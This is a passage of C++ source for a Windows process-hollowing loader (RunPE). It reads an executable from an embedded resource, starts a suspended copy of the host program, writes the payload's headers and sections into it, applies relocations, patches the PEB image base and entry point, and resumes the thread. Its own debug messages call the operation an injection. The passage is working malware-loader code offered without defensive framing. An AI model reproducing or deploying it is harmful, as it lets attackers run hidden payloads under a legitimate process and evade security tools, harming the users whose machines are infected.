	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
#ifdef _WIN64
BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;


		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

		}
	}

	printf("[+] Relocations done.\n");

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}
#endif

int RunPE(int resourceId)
{
	char modulePath[1024];
	GetModuleFileNameA(NULL, modulePath, 1024);

	OutputDebugStringA("[PROCESS HOLLOWING]\n");

	const LPVOID hFileContent = GetFileContent(resourceId);
	if (hFileContent == nullptr)
		return -1;

	// OutputDebugStringA("[+] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hFileContent);
	OutputDebugStringA("[+] PE file content : 0x%p\n");

	const BOOL bPE = IsValidPE(hFileContent);
	if (!bPE)
	{
		OutputDebugStringA("[-] The PE file is not valid !\n");
		if (hFileContent != nullptr)
			HeapFree(GetProcessHeap(), 0, hFileContent);
		return -1;
	}

	OutputDebugStringA("[+] The PE file is valid.\n");

	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	const BOOL bProcessCreation = CreateProcessA(modulePath, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
	if (!bProcessCreation)
	{
		OutputDebugStringA("[-] An error is occured when trying to create the target process !\n");
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	BOOL bTarget32;
	IsWow64Process(PI.hProcess, &bTarget32);

	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
	if (bTarget32)
	{
		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			OutputDebugStringA("[-] An error is occured when trying to get the image base address of the target process !\n");
			CleanAndExitProcess(&PI, hFileContent);
			return -1;
		}
	}
#ifdef _WIN64
	else
	{
		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			OutputDebugStringA("[-] An error is occured when trying to get the image base address of the target process !\n");
			CleanAndExitProcess(&PI, hFileContent);
			return -1;
		}
	}
#else
	else {
		return -1;
	}

#endif

	// OutputDebugStringA("[+] Target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
	// OutputDebugStringA("[+] Target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);
	OutputDebugStringA("[+] Target Process Image Base : 0x%p\n");

	const BOOL bSource32 = IsPE32(hFileContent);
	if (bSource32)
		OutputDebugStringA("[+] Source PE Image architecture : x86\n");
	else
		OutputDebugStringA("[+] Source PE Image architecture : x64\n");

	if (bTarget32)
		OutputDebugStringA("[+] Target PE Image architecture : x86\n");
	else
		OutputDebugStringA("[+] Target PE Image architecture : x64\n");

	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
		OutputDebugStringA("[+] Architecture are compatible !\n");
	else
	{
		OutputDebugStringA("[-] Architecture are not compatible !\n");
		return -1;
	}

	DWORD dwSourceSubsystem;
	if (bSource32)
		dwSourceSubsystem = GetSubsytem32(hFileContent);
	else
		dwSourceSubsystem = GetSubsytem64(hFileContent);

	if (dwSourceSubsystem == (DWORD)-1)
	{
		OutputDebugStringA("[-] An error is occured when trying to get the subsytem of the source image.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	// OutputDebugStringA("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);
	OutputDebugStringA("[+] Source Image subsystem : 0x%X\n");

	DWORD dwTargetSubsystem;
	if (bTarget32)
		dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
	else
		dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1)
	{
		OutputDebugStringA("[-] An error is occured when trying to get the subsytem of the target process.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	// OutputDebugStringA("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);

	if (dwSourceSubsystem == dwTargetSubsystem)
		OutputDebugStringA("[+] Subsytems are compatible.\n");
	else
	{
		OutputDebugStringA("[-] Subsytems are not compatible.\n");
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	BOOL bHasReloc;
	if (bSource32)
		bHasReloc = HasRelocation32(hFileContent);
	else
		bHasReloc = HasRelocation64(hFileContent);

	if (!bHasReloc)
		OutputDebugStringA("[+] The source image doesn't have a relocation table.\n");
	else
		OutputDebugStringA("[+] The source image has a relocation table.\n");


	if (bSource32 && !bHasReloc)
	{
		if (RunPE32(&PI, hFileContent))
		{
			OutputDebugStringA("[+] The injection has succeed !\n");
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	if (bSource32 && bHasReloc)
	{
		if (RunPEReloc32(&PI, hFileContent))
		{
			OutputDebugStringA("[+] The injection has succeed !\n");
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	if (!bSource32 && !bHasReloc)
	{
#ifdef _WIN64
		if (RunPE64(&PI, hFileContent))
		{
			OutputDebugStringA("[+] The injection has succeed !\n");
			CleanProcess(&PI, hFileContent);
			return 0;
		}
#else
		return 0;
#endif
	}

	if (!bSource32 && bHasReloc)
	{
#ifdef _WIN64
		if (RunPEReloc64(&PI, hFileContent))
		{
			OutputDebugStringA("[+] The injection has succeed !\n");
			CleanProcess(&PI, hFileContent);
			return 0;
		}
#else 
		return 0;
#endif
	}

	OutputDebugStringA("[-] The injection has failed !\n");

	if (hFileContent != nullptr)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (PI.hThread != nullptr)
		CloseHandle(PI.hThread);

	if (PI.hProcess != nullptr)
	{
		TerminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hProcess);
	}

	return -1;
}
